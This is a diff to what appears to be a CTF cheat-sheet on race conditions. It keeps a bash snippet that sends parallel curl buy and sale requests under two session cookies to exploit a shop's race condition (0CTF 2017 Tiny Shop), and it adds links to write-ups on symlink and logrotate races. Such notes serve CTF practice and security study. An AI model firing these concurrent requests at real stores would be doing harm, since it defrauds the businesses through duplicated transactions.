@@ -1,4 +1,4 @@
-# racing
+# racing, race-condition
 
 ```bash
 username=
@@ -15,5 +15,9 @@ curl "$url?action=buy&id=1" -b $cookie1
 curl "$url?action=sale&id=1" -b $cookie1 &\
 curl "$url?action=sale&id=1" -b $cookie2
 ```
+- [Temmo's Tiny Shop - 0CTF 2017](https://www.40huo.cn/blog/0ctf-2017-writeup.html)
 
-https://www.40huo.cn/blog/0ctf-2017-writeup.html
+### symlink
+
+- [Book \- HackThebox | Samir Ettali](https://samirettali.com/writeups/hackthebox/book/)
+    - https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition
